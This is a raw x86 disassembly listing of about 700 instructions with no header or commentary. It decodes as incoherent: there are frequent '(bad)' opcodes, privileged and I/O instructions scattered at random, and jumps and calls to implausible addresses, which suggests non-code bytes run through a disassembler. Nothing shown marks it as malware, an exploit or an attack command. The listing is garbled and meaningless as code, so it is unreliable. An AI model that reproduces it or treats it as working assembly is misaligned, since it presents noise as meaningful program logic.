  432171:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432178:	add    BYTE PTR [ebp+0x46],0x8b
  43217c:	jmp    0xf98b:0x100041c8
  432183:	xor    esi,DWORD PTR [edx+0x3]
  432186:	mov    ecx,DWORD PTR [edi]
  432188:	fmul   DWORD PTR [edx]
  43218a:	add    BYTE PTR [eax],al
  43218c:	lea    eax,[ebx-0x4700273c]
  432192:	add    al,0x4f
  432194:	pop    DWORD PTR [eax]
  432196:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43219c:	push   edx
  43219d:	inc    WORD PTR [ebp+0x8]
  4321a1:	mov    eax,0x514f4d
  4321a6:	(bad)
  4321aa:	add    al,al
  4321ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321b2:	test   DWORD PTR [esi+0x74],esp
  4321b5:	inc    ebp
  4321b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4321bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321c2:	or     dh,cl
  4321c4:	or     eax,0x8b8d5045
  4321c9:	inc    ebp
  4321ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4321d0:	jne    0x432205
  4321d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321d8:	add    DWORD PTR [ebx],eax
  4321da:	add    bh,bh
  4321dc:	adc    DWORD PTR [eax],ecx
  4321de:	adc    DWORD PTR [ebp+0x55],edi
  4321e1:	push   es
  4321e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321ef:	inc    ebp
  4321f0:	mov    esp,edi
  4321f2:	or     al,0xda
  4321f4:	push   eax
  4321f5:	(bad)  
  4321f6:	jne    0x4321ac
  4321f8:	call   0x3b1ae7
  4321fd:	inc    ebp
  4321fe:	sar    BYTE PTR [eax],0x84
  432201:	in     al,dx
  432202:	add    bh,al
  432204:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43220b:	(bad)  
  43220c:	and    al,al
  43220e:	fs in  eax,dx
  432210:	inc    DWORD PTR [ebp-0x7b]
  432213:	jle    0x432224
  432215:	leave  
  432216:	scas   al,BYTE PTR es:[edi]
  432217:	inc    esp
  432218:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43221f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432226:	call   DWORD PTR [edi]
  432228:	shr    ah,0x84
  43222b:	xchg   DWORD PTR [eax],eax
  43222d:	add    DWORD PTR [eax],eax
  43222f:	add    bh,bh
  432231:	dec    ebp
  432232:	and    BYTE PTR [ecx-0x38],dl
  432235:	push   eax
  432236:	dec    DWORD PTR [ebx+0xfd885]
  43223c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432242:	mov    WORD PTR [ecx+0x0],ss
  432245:	lea    ecx,[ebx+0x108b20d8]
  43224b:	mov    WORD PTR [edx],ds
  43224d:	add    BYTE PTR [edi+0xff01ff],al
  432253:	mov    ecx,DWORD PTR [ebp-0x28]
  432256:	push   ecx
  432257:	shl    BYTE PTR [ebp+0x3a],0x8b
  43225b:	inc    ebp
  43225c:	in     al,0xeb
  43225e:	jno    0x4321eb
  432260:	push   edx
  432261:	mov    DWORD PTR [eax-0x28],edx
  432264:	mov    eax,DWORD PTR [ebp+0x20]
  432267:	je     0x4321f0
  432269:	mov    eax,DWORD PTR [ecx]
  43226b:	sbb    BYTE PTR [eax],al
  43226d:	pop    DWORD PTR [eax]
  43226f:	add    esi,eax
  432271:	add    bl,al
  432273:	adc    DWORD PTR [edi],esi
  432275:	jmp    0x8bce72c7
  43227a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432281:	jne    0x43220e
  432283:	mov    ecx,DWORD PTR [eax]
  432285:	in     al,0x75
  432287:	pop    DWORD PTR [ecx+0x5401]
  43228d:	push   edx
  43228e:	inc    DWORD PTR [ebx]
  432290:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432296:	add    BYTE PTR [edi+0x9],dl
  432299:	call   DWORD PTR [esi]
  43229b:	and    dl,al
  43229d:	and    bh,bh
  43229f:	inc    edi
  4322a1:	test   eax,edx
  4322a3:	sldt   ebx
  4322a6:	xor    al,BYTE PTR [eax]
  4322a8:	pushf  
  4322a9:	(bad)  
  4322aa:	jmp    0x4322b8
  4322ac:	mov    eax,edi
  4322ae:	or     al,0x75
  4322b0:	inc    eax
  4322b1:	call   0x4319b9
  4322b6:	mov    eax,eax
  4322b8:	loopne 0x43223e
  4322ba:	inc    ebp
  4322bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322c1:	mov    eax,DWORD PTR [ebp+0x20]
  4322c4:	add    edi,ecx
  4322c6:	add    BYTE PTR [eax],ch
  4322c8:	cmp    edi,0x18
  4322cb:	test   DWORD PTR [ebp+0xf],esi
  4322ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322d5:	jne    0x4322d9
  4322d7:	call   0xffa21d9c
  4322dc:	leave  
  4322dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4322e1:	add    ah,ch
  4322e3:	add    BYTE PTR [edi-0x48fef979],dh
  4322e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322f0:	inc    esp
  4322f1:	mov    ebx,DWORD PTR [eax]
  4322f3:	fcom   st(2)
  4322f5:	add    BYTE PTR [edi],bl
  4322f7:	lea    ecx,[eax-0x18]
  4322fa:	(bad)  
  4322fb:	push   DWORD PTR [ecx]
  4322fd:	call   0xffb5705f
  432302:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432306:	fstp   DWORD PTR [esi+ebx*8]
  432309:	push   ebp
  43230a:	pop    ebp
  43230b:	mov    esi,DWORD PTR [edx-0x38]
  43230e:	add    DWORD PTR [eax],0x28
  432311:	mov    edi,DWORD PTR [ebx]
  432313:	xor    esi,DWORD PTR [edx+0x3]
  432316:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43231a:	pop    ebp
  43231b:	or     al,0x4
  43231d:	inc    ecx
  43231e:	push   ebp
  43231f:	(bad)  
  432320:	in     al,dx
  432321:	or     ah,ch
  432323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432324:	xbegin 0xffc8991a
  43232a:	clc    
  43232b:	adc    al,0x45
  43232d:	div    BYTE PTR [edx]
  43232f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432336:	test   DWORD PTR [ebx+0x666300f8],ebx
  43233c:	add    BYTE PTR [ecx+0x66],dh
  43233f:	add    eax,DWORD PTR [ebp+0x52]
  432342:	adc    eax,0xffffffa0
  432345:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43234b:	test   DWORD PTR [eax],eax
  43234d:	clc    
  43234e:	data16 or al,BYTE PTR [ebp+0x45]
  432352:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432359:	rol    BYTE PTR [ebp+0x45],1
  43235c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432362:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432368:	push   ebx
  432369:	add    BYTE PTR [eax+eax*1+0x51],dl
  43236d:	jge    0x4323a2
  43236f:	add    BYTE PTR [esi+0x4],dl
  432372:	jne    0x4323d9
  432374:	mov    edx,0x457200
  432379:	jmp    0x43233d
  43237b:	xor    edi,DWORD PTR [ebx]
  43237d:	pop    edi
  43237e:	cvtdq2ps xmm7,xmm0
  432381:	ret    0x0
  432384:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43238a:	xor    ecx,DWORD PTR [edi]
  43238c:	add    eax,DWORD PTR [ecx+0x3b]
  43238f:	push   ebx
  432390:	rdpmc  
  432392:	out    0x8d,al
  432394:	add    BYTE PTR [eax],cl
  432396:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43239c:	ret    0x450c
  43239f:	sbb    al,0x8b
  4323a1:	cmp    eax,esi
  4323a3:	or     cl,al
  4323a5:	or     al,0xc2
  4323a7:	pop    eax
  4323a8:	inc    ebp
  4323a9:	add    ecx,DWORD PTR [edi]
  4323ab:	add    esi,DWORD PTR [ebp+0x39]
  4323ae:	invd   
  4323b0:	jge    0x4323bc
  4323b2:	mov    eax,0x478ac0
  4323b7:	cli    
  4323b8:	xor    esp,ecx
  4323ba:	mov    ebx,0x5b8ac0
  4323bf:	ret    0x33
  4323c2:	mov    eax,0x833b8b
  4323c7:	sub    BYTE PTR [ebx],al
  4323c9:	inc    ebp
  4323ca:	xor    ax,di
  4323cd:	pushf  
  4323ce:	inc    bh
  4323d0:	mov    esp,esp
  4323d2:	hlt    
  4323d3:	test   DWORD PTR [ebp-0x8],esi
  4323d6:	mov    eax,DWORD PTR [ebp-0x14]
  4323d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323df:	dec    edi
  4323e0:	or     BYTE PTR [eax],al
  4323e2:	jne    0x43236d
  4323e4:	mov    esi,esp
  4323e6:	call   0x77a9afab
  4323eb:	inc    ebp
  4323ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323f8:	add    BYTE PTR [esi+0x7d],ah
  4323fb:	inc    ebp
  4323fc:	mov    bx,WORD PTR [ebp+0x8]
  432400:	add    DWORD PTR [ebp+0x54],0x30c008b
  432407:	inc    ebp
  432408:	mov    bx,di
  43240b:	lock test BYTE PTR [ecx+0x7000801],bh
  432412:	jge    0x4323d5
  432414:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43241a:	cli    
  43241b:	xor    bl,bh
  43241d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432423:	test   BYTE PTR [eax],cl
  432425:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43242c:	cmp    ebp,eax
  43242e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432435:	test   BYTE PTR [ebp+0x1],bh
  432438:	mov    ebx,0x458a00
  43243d:	xor    esi,DWORD PTR [ebx]
  43243f:	add    esp,DWORD PTR [esi-0x77]
  432442:	pop    ebp
  432443:	loopne 0x4324ab
  432445:	inc    ebp
  432446:	clc    
  432447:	xor    edi,DWORD PTR [ebx]
  432449:	add    esi,DWORD PTR [edx-0x77]
  43244c:	data16 fdivr QWORD PTR [ebp-0x49]
  432450:	mov    ebx,0xb78afc
  432455:	hlt    
  432456:	xor    edi,DWORD PTR [esi+eiz*2]
  432459:	add    BYTE PTR [ebp+0x66],bl
  43245c:	data16 lock clc 
  43245f:	cmp    al,0x3b
  432461:	add    BYTE PTR [edi+0x66],dh
  432464:	psubq  mm7,QWORD PTR [ebp+0x2]
  432468:	ltr    WORD PTR [ebp+0x66]
  43246c:	add    esi,eax
  43246e:	add    di,WORD PTR [ebp+0x2b]
  432472:	data16 data16 jge 0x4324f3
  432476:	mov    ebx,0xe08a8b
  43247b:	jge    0x4324b0
  43247d:	data16 data16 xor al,0x5d
  432481:	data16 data16 jne 0x43247d
  432485:	mov    edi,DWORD PTR [ebx]
  432487:	fdiv   QWORD PTR [edx+0x7d]
  43248a:	data16 data16 jge 0x4324c2
  43248e:	mov    ebx,0x758a66
  432493:	mov    esi,0x667233
  432498:	pop    ebp
  432499:	or     BYTE PTR [esi+0x0],ah
  43249c:	clc    
  43249d:	mov    edi,DWORD PTR [ebx]
  43249f:	lock ja 0x43242d
  4324a2:	(bad)  
  4324a4:	jge    0x43249d
  4324a6:	invd   
  4324a8:	pop    ebp
  4324a9:	add    BYTE PTR [ebx],al
  4324ab:	(bad)  
  4324ac:	cmp    di,WORD PTR [ebp+0xf]
  4324b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324b4:	mov    bx,WORD PTR [ebp-0x10]
  4324b8:	pop    bp
  4324ba:	fbstp  TBYTE PTR [ebx]
  4324bc:	test   DWORD PTR [ebx],eax
  4324be:	add    BYTE PTR [ebx],bh
  4324c0:	add    BYTE PTR [esi+0x7d],ah
  4324c3:	jge    0x432450
  4324c5:	data16 in al,dx
  4324c7:	pop    ebp
  4324c8:	stc    
  4324c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324d0:	mov    edi,ebx
  4324d2:	in     al,dx
  4324d3:	test   BYTE PTR [ebp+0x0],bh
  4324d6:	mov    eax,DWORD PTR [eax]
  4324d8:	call   0xbd401e68
  4324dd:	cmp    al,0x9b
  4324df:	add    BYTE PTR [edx],dh
  4324e1:	mov    bx,di
  4324e4:	call   0x8b4ba274
  4324e9:	add    ebp,esp
  4324eb:	mov    bx,di
  4324ee:	jnp    0x432516
  4324f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324f6:	mov    eax,DWORD PTR [eax]
  4324f8:	call   0x7c3eb063
  4324fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432503:	data16 data16 fistp WORD PTR [ebp+0xe]
  432508:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432512:	fisttp WORD PTR [ecx-0x7401f77b]
  432518:	(bad)  
  432519:	cld    
  43251a:	jne    0x432558
  43251c:	xor    eax,DWORD PTR [eax]
  43251e:	mov    esp,DWORD PTR [esi-0x10]
  432521:	sti    
  432522:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432529:	data16 adc bl,bh
  43252c:	push   ebp
  43252d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432534:	mov    WORD PTR [eax],es
  432536:	fwait
  432537:	data16 xor bh,bl
  43253a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432540:	mov    esp,DWORD PTR [esi-0x14]
  432543:	fisttp WORD PTR [ebx-0x3748a9f2]
  432549:	or     al,0x2b
  43254b:	mov    bh,0xba
  43254d:	hlt    
  43254e:	mov    bh,bl
  432550:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432556:	dec    esi
  432557:	or     al,0x0
  432559:	mov    edi,DWORD PTR [ebx]
  43255b:	or     BYTE PTR [ebp+0x3b],dh
  43255e:	mov    ecx,DWORD PTR [edi]
  432560:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432566:	xor    al,0xd8
  432568:	pop    bp
  43256a:	lock xor esi,DWORD PTR [ebx]
  43256d:	lea    esp,[esi+0x1f]
  432570:	icebp  
  432571:	jb     0x432577
  432573:	add    al,al
  432575:	jge    0x432583
  432577:	mov    eax,eax
  432579:	fsubr  st,st(3)
  43257b:	pop    ebp
  43257c:	mov    esi,DWORD PTR [ebx]
  43257e:	in     al,0x8d
  432580:	rcr    DWORD PTR [edi],0xc2
  432583:	jb     0x4325e3
  432585:	add    cl,cl
  432587:	jge    0x432595
  432589:	mov    edx,DWORD PTR [ebp-0x20]
  43258c:	in     al,dx
  43258d:	pop    ebp
  43258e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432593:	cmp    di,WORD PTR [ebp+0x0]
  432597:	mov    ebp,DWORD PTR [ebx]
  432599:	fdivr  QWORD PTR [esi+0x668a5d]
  43259f:	cmp    al,0x33
  4325a1:	mov    si,0x4e7d
  4325a5:	mov    eax,DWORD PTR [eax]
  4325a7:	lock inc ebp
  4325a9:	mov    esi,DWORD PTR [eax]
  4325ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325b2:	clc    
  4325b3:	(bad)  
  4325b4:	cmp    edi,DWORD PTR [ebx]
  4325b6:	je     0x4325c7
  4325b8:	push   ebx
  4325b9:	loopne 0x4325ca
  4325bb:	dec    ecx
  4325bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4325c0:	int    0xf1
  4325c2:	mov    esi,0x703084d
  4325c7:	pcmpgtd mm6,mm1
  4325ca:	add    BYTE PTR [ebp+0x66],dh
  4325cd:	jmp    0x43259a
  4325cf:	mov    eax,DWORD PTR [ebx]
  4325d1:	lock push ebp
  4325d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325d9:	or     bh,dl
  4325db:	jb     0x4325db
  4325dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325e3:	loopne 0x4325e5
  4325e5:	jne    0x4325e9
  4325e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4325eb:	mov    ecx,ebx
  4325ed:	data16 cmp al,0xf1
  4325f0:	add    BYTE PTR [esi+eiz*2],bh
  4325f3:	add    bl,cl
  4325f5:	retw   0xf2
  4325f9:	ret    0x66
  4325fc:	retf   
  4325fd:	enterw 0x4df1,0x19
  432602:	pop    edi
  432603:	jne    0x432586
  432605:	mov    esi,DWORD PTR [eax]
  432607:	call   0x77b7b1a8
  43260c:	xor    ebp,DWORD PTR [ebx]
  43260e:	lea    esp,[esi+0x48]
  432611:	repnz in eax,0x3b
  432614:	add    BYTE PTR [ebp-0x37],dh
  432617:	xor    edx,DWORD PTR [ebp-0x15]
  43261a:	in     al,dx
  43261b:	xor    edx,DWORD PTR [esi+0x40]
  43261e:	mov    DWORD PTR [edi],0x338545fc
  432624:	clc    
  432625:	add    esi,DWORD PTR [ecx]
  432627:	pop    edi
  432628:	pushf  
  432629:	pop    ebx
  43262a:	call   0xff4425f1
  43262f:	mov    edi,eax
  432631:	push   ecx
  432632:	pop    es
  432633:	mov    edi,DWORD PTR [eax]
  432635:	push   esi
  432636:	inc    esi
  432637:	add    bh,BYTE PTR [esi+0x0]
  43263a:	popa   
  43263b:	data16 (bad) 
  43263d:	into   
  43263e:	gs cmp al,0xcd
  432641:	add    BYTE PTR [ecx+0x7ce0866],bh
  432647:	ret    0x66
  43264a:	add    bh,al
  43264c:	add    bh,ah
  43264e:	add    BYTE PTR [ebp+0x31c3f866],al
  432654:	cmp    al,0x9c
  432656:	add    BYTE PTR [esi+0x66],ah
  432659:	into   
  43265a:	ret    
  43265b:	pop    ebp
  43265c:	adc    BYTE PTR [edi+0x0],dl
  43265f:	mov    bh,0x66
  432661:	mov    edi,0xff038dc3
  432666:	jne    0x4326bc
  432668:	lea    edx,[ecx+0x1]
  43266b:	mov    ebx,0xd64ff1
  432670:	sar    DWORD PTR [ebx],1
  432672:	test   BYTE PTR [ebp+0x36],dh
  432675:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432679:	push   edi
  43267a:	xor    BYTE PTR [ebx],0x38
  43267d:	mov    esi,ebx
  43267f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432685:	ss inc ebp
  432687:	fs pop ebx
  432689:	mov    ebx,0x9c3b30
  43268e:	je     0x4326bb
  432690:	xor    edi,DWORD PTR [ebx+0x668a33]
  432696:	mov    WORD PTR [ebx],?
  432698:	ss mov ebx,0x8b4e64
  43269e:	pop    edi
  43269f:	cmp    ecx,ecx
  4326a1:	jne    0x4326f8
  4326a3:	mov    ebp,esp
  4326a5:	cld    
  4326a6:	push   esi
  4326a7:	pop    ebx
  4326a8:	inc    ebp
  4326a9:	stc    
  4326aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4326b0:	test   esi,ecx
  4326b2:	clc    
  4326b3:	test   dl,dl
  4326b5:	cmp    bh,bh
  4326b7:	fs pop si
  4326ba:	or     bl,al
  4326bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4326c2:	retf   0x3c45
  4326c5:	xor    BYTE PTR [eax],al
  4326c7:	pushf  
  4326c8:	mov    si,0x85ca
  4326cc:	ret    0xf8
  4326cf:	pop    ebx
  4326d0:	dec    dx
  4326d3:	mov    edx,DWORD PTR [edi-0x76]
  4326d6:	push   edi
  4326d7:	add    al,0xb7
  4326d9:	xor    al,0xba
  4326db:	cmp    al,0x8d
  4326dd:	je     0x4326de
  4326df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326e3:	lea    edi,[ebx+0x544fff]
  4326e9:	push   ecx
  4326ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4326ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326f3:	add    BYTE PTR [ebx],dh
  4326f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432702:	mov    ebx,0x3b3b00
  432707:	jne    0x432734
  432709:	mov    DWORD PTR [ebx+0x728afc],edi
  43270f:	xor    esi,DWORD PTR [ebx]
  432711:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432717:	push   edi
  432718:	cmp    esp,ebp
  43271a:	jne    0x43271c
  43271c:	sbb    DWORD PTR [eax],0x8085c3fc
  432722:	clc    
  432723:	inc    esi
  432724:	pop    ebx
  432725:	sti    
  432726:	add    eax,0xeb8bc075
  43272b:	cld    
  43272c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432732:	mov    ecx,DWORD PTR [ecx+edx*2]
  432735:	rol    DWORD PTR [ebp-0x37],0xf
  432739:	mov    DWORD PTR [eax],ecx
  43273b:	inc    edi
  43273c:	(bad)  
  43273d:	in     eax,0xfe
  43273f:	add    bh,bh
  432741:	(bad)  
  432742:	mov    esi,0xc38a5e
  432747:	mov    esi,DWORD PTR [ebx]
  432749:	push   ecx
  43274a:	mov    edi,0xfc4ec7
  43274f:	test   DWORD PTR [ebp-0x8],edx
  432752:	xor    di,ax
  432755:	pushf  
  432756:	sub    ebp,eax
  432758:	inc    ebp
  432759:	(bad)  
  43275a:	sub    edi,edi
  43275c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432762:	inc    ebp
  432763:	add    BYTE PTR [esi+0x2b],ah
  432766:	or     bh,BYTE PTR [edx+0xf8ac2]
  43276c:	cmp    al,0x33
  43276e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432774:	(bad)  
  432775:	cmp    esi,DWORD PTR [ebx]
  432777:	je     0x432731
  432779:	push   ebx
  43277a:	dec    esi
  43277b:	str    ecx
  43277e:	cmp    esp,DWORD PTR [ebp+0x75]
  432781:	int    0x33
  432783:	mov    edi,0x789085f
  432788:	mov    edx,DWORD PTR [eax]
  43278a:	cld    
  43278b:	add    cl,cl
  43278d:	data16 add al,0xcb
  432790:	push   ebp
  432791:	add    ebp,esp
  432793:	jne    0x432781
  432795:	(bad)  
  432796:	mov    DWORD PTR [ecx],0xd685f7ec
  43279c:	clc    
  43279d:	xlat   BYTE PTR ds:[ebx]
  43279e:	inc    ebp
  43279f:	mov    esi,DWORD PTR [edx]
  4327a1:	push   eax
  4327a2:	pushf  
  4327a3:	in     eax,0x8b
  4327a5:	add    ah,ch
  4327a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4327ab:	add    ax,0x72cb
  4327af:	cmp    al,0x0
  4327b1:	add    BYTE PTR [ebp+0x66],al
  4327b4:	(bad)  
  4327b5:	retf   
  4327b6:	lock ret 0x85
  4327ba:	clc    
  4327bb:	inc    bp
  4327bd:	retf   
  4327be:	cmp    eax,0xc77d9cc8
  4327c3:	xor    ah,bh
  4327c5:	pushf  
  4327c6:	test   DWORD PTR [edi-0x8],ebx
  4327c9:	je     0x432810
  4327cb:	xor    esi,DWORD PTR ds:0x7020840
  4327d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4327d5:	push   ebp
  4327d6:	add    esp,ebp
  4327d8:	jb     0x432765
  4327da:	add    BYTE PTR [eax],cl
  4327dc:	dec    ebp
  4327dd:	mov    bh,0x81
  4327df:	push   esi
  4327e0:	push   esp
  4327e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327e8:	xor    al,BYTE PTR [eax]
  4327ea:	mov    edx,DWORD PTR [edi+0x10]
  4327ed:	(bad)  
  4327ee:	scas   eax,DWORD PTR es:[edi]
  4327ef:	ret    0x3b
  4327f2:	jns    0x3b4424e5
  4327f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327fc:	dec    ebp
  4327fd:	or     BYTE PTR [ebx],ch
  4327ff:	ret    0x458b
  432802:	lock jmp 0x4327f6
  432805:	mov    ecx,DWORD PTR [eax]
  432807:	or     BYTE PTR [edi],al
  432809:	mov    ecx,eax
  43280b:	xor    DWORD PTR [edx+0x2],0x0
  43280f:	mov    bh,0xc1
  432811:	adc    BYTE PTR [eax],dh
  432813:	iret   
  432814:	inc    ebp
  432815:	mov    DWORD PTR [ebx],0x4dfff8c4
  43281b:	inc    BYTE PTR [ebx]
  43281d:	ret    0xf8
  432820:	adc    DWORD PTR [esi+0x10],esp
  432823:	clc    
  432824:	dec    ecx
  432825:	fisttp WORD PTR [ecx+0x456604c0]
  43282b:	add    dh,BYTE PTR ds:0x75e0845
  432831:	ret    0x4d
  432834:	lea    ecx,[ebx+0x18728301]
  43283a:	add    BYTE PTR [ebp+0x45],al
  43283d:	xor    ecx,ebp
  43283f:	pushf  
  432840:	add    bh,al
  432842:	add    al,ch
  432844:	inc    ebp
  432845:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43284b:	xor    eax,0x781084d
  432850:	push   esp
  432851:	fwait
  432852:	push   ecx
  432853:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432859:	inc    ebp
  43285a:	cmp    edi,DWORD PTR [ecx]
  43285c:	jbe    0x4327fa
  43285e:	mov    eax,edi
  432860:	or     ah,dh
  432862:	inc    ebp
  432863:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432869:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43286f:	in     al,dx
  432870:	hlt    
  432871:	push   esp
  432872:	push   esp
  432873:	push   ecx
  432874:	push   ecx
  432875:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43287b:	fwait
  43287c:	fwait
  43287d:	xor    dh,BYTE PTR [edx]
  43287f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432885:	or     BYTE PTR [ebp+0x7],al
  432888:	mov    eax,ecx
  43288a:	clc    
  43288b:	jb     0x43284e
  43288d:	add    BYTE PTR [ebp+0x55],cl
  432890:	or     DWORD PTR [edi],0xc251d154
  432896:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4328a0:	mov    edi,eax
  4328a2:	or     cl,al
  4328a4:	inc    ebp
  4328a5:	dec    ebp
  4328a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4328ac:	or     WORD PTR [ecx],0x899b
  4328b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328b7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ba:	mov    eax,DWORD PTR [ebp-0x8]
  4328bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328ca:	inc    ebp
  4328cb:	dec    eax
  4328cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328d2:	add    edx,DWORD PTR [ecx-0x8]
  4328d5:	mov    ecx,DWORD PTR [ecx]
  4328d7:	clc    
  4328d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328df:	mov    ecx,ebp
  4328e1:	clc    
  4328e2:	(bad)  
  4328e3:	popf   
  4328e4:	inc    DWORD PTR [eax]
  4328e6:	ret    0x8b
  4328e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328ef:	mov    edi,esp
  4328f1:	hlt    
  4328f2:	test   ecx,esi
  4328f4:	clc    
  4328f5:	or     BYTE PTR [ebp+0x7],al
  4328f8:	xor    al,cl
  4328fa:	pushf  
  4328fb:	jb     0x432930
  4328fd:	add    BYTE PTR [eax-0x3f],al
  432900:	inc    eax
  432901:	daa    
  432902:	inc    ebp
  432903:	inc    ebp
  432904:	xor    eax,0x7f80803
  432909:	dec    ebp
  43290a:	fwait
  43290b:	add    esi,DWORD PTR [edx]
  43290d:	clc    
  43290e:	cmp    DWORD PTR [ecx],ecx
  432910:	or     al,0x8
  432912:	add    al,BYTE PTR [ebp+0x2c]
  432915:	xor    eax,0x7350845
  43291a:	or     BYTE PTR [ebp+0x7],cl
  43291d:	lea    ebx,[ebx-0x748dcdff]
  432923:	add    BYTE PTR [eax*2-0x74b21438],cl
  43292a:	mov    edx,DWORD PTR [eax]
  43292c:	cld    
  43292d:	dec    ebp
  43292e:	push   esp
  43292f:	sub    edx,DWORD PTR [ecx-0x75]
  432932:	add    eax,0xf172fc
  432937:	or     BYTE PTR [ebp+0x7],cl
  43293a:	add    eax,ecx
  43293c:	or     al,0x72
  43293e:	add    DWORD PTR [eax],eax
  432940:	mov    ebx,0x29c2c1
  432945:	inc    ebp
  432946:	mov    eax,DWORD PTR [ebx]
  432948:	cmp    eax,0x3004d1c
  43294e:	xbegin 0x66c8b548
  432954:	clc    
  432955:	or     BYTE PTR [ebp+0x45],al
  432958:	xor    dh,BYTE PTR ds:0x78b089c
  43295e:	adc    BYTE PTR [ebp+0x45],cl
  432961:	lea    eax,[ebp+0x33727501]
  432967:	add    cl,ch
  432969:	inc    ebp
  43296a:	add    bl,ch
  43296c:	add    BYTE PTR [ebx+0x45850845],cl
  432972:	je     0x4328ff
  432974:	push   ebx
  432975:	or     al,0x85
  432977:	dec    ebp
  432978:	std    
  432979:	mov    bh,bh
  43297b:	mov    BYTE PTR [ebp-0x75],al
  43297e:	mov    edi,eax
  432980:	or     al,0x89
  432982:	inc    ebp
  432983:	clc    
  432984:	mov    esp,esp
  432986:	hlt    
  432987:	call   DWORD PTR [edi-0x37]
  43298a:	push   esp
  43298b:	or     al,0x51
  43298d:	push   ebp
  43298e:	xor    ebp,esp
  432990:	mov    esi,0x457251
  432995:	xor    esi,eax
  432997:	pushf  
  432998:	inc    ebp
  432999:	(bad)  
  43299a:	mov    edi,eax
  43299c:	or     al,0x85
  43299e:	add    al,bh
  4329a0:	inc    eax
  4329a2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329a6:	or     ah,bh
  4329a8:	inc    eax
  4329a9:	push   esp
  4329aa:	jmp    0x4329fd
  4329ac:	mov    eax,DWORD PTR ds:0xe8720c
  4329b2:	mov    DWORD PTR [ebp-0x8],eax
  4329b5:	jne    0x4329fc
  4329b7:	jmp    0x432944
  4329b9:	mov    ebp,DWORD PTR [eax]
  4329bb:	clc    
